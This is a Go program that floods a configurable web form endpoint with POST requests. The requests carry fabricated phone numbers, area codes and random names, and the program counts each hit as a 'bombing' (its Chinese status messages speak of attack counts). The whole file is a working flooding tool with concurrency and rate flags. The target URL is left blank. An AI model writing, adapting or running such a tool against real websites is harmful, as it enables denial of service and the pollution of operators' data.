package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const ADD = ""
const REG = "([0-9]+)"

var procs int
var timeout int
var duration int
var limit int

func init() {
	flag.IntVar(&procs, "proc", 1, "Start n processes.")
	flag.IntVar(&timeout, "timeout", 10, "Set timeout")
	flag.IntVar(&duration, "freq", 1000, "Set access frequency (ms)")
	flag.IntVar(&limit, "limit", 0, "Set limit, 0 means no limit")
	flag.Parse()
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	ch := make(chan int, 1024)
	si := make(chan os.Signal, 1)
	signal.Notify(si, os.Interrupt, os.Kill)
	client := new(http.Client)
	client.Timeout = time.Second * time.Duration(timeout)
	for i := 0; i < procs; i++ {
		go whoop(client, ch, i, duration)
		time.Sleep(time.Duration(duration) * time.Millisecond)
	}
	counter := 0
	for {
		if limit > 0 && counter >= limit {
			fmt.Printf("\n\n已达到最大攻击次数：%d\n", limit)
			os.Exit(0)
		}

		select {
		case <-ch:
			counter++
			fmt.Printf("已轰炸%d次\r", counter)
		case <-si:
			fmt.Printf("\n\n收到信号，程序退出，共轰炸%d次\n", counter)
			os.Exit(0)
		default:
			continue
		}
	}
	defer func() {
		if x := recover(); x != nil {
			fmt.Fprintf(os.Stderr, "访问被阻止，程序退出")
		}
	}()
}

func whoop(client *http.Client, ch chan int, proc int, duration int) {
	rn := regexp.MustCompile(REG)
	for {
		vals := make(url.Values)
		vals.Set("Area", strconv.Itoa(rand.Int()%100))
		vals.Set("TEL", fmt.Sprintf("1%02d%08d", rand.Int()%100, rand.Int()%100000000))
		vals.Set("Name",
			base64.StdEncoding.EncodeToString(
				[]byte(
					strconv.Itoa(
						rand.Int(),
					),
				)[0:3],
			),
		)

		req, err := http.NewRequest(
			"POST",
			ADD,
			strings.NewReader(vals.Encode()),
		)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if err != nil {
			fmt.Fprintf(os.Stderr, "Got Err: %v\n", err)
			os.Exit(1)
		}

		d, err := client.Do(req)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Proc %d Got Err: %v\n", proc, err)
			continue
		}
		if d.StatusCode == 200 {
			body, err := ioutil.ReadAll(d.Body)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Proc %d Got Err: %v\n", proc, err)
			}
			na := rn.FindAllString(string(body), -1)
			if len(na) > 0 {
				ch <- 1
			} else {
				fmt.Fprintf(os.Stderr, "访问被阻止，程序退出")
				os.Exit(1)
			}
		} else {
			fmt.Fprintf(os.Stderr, "Proc %d Got Err: %s\n", proc, d.Status)
		}
		time.Sleep(time.Duration(duration) * time.Millisecond)
	}
}
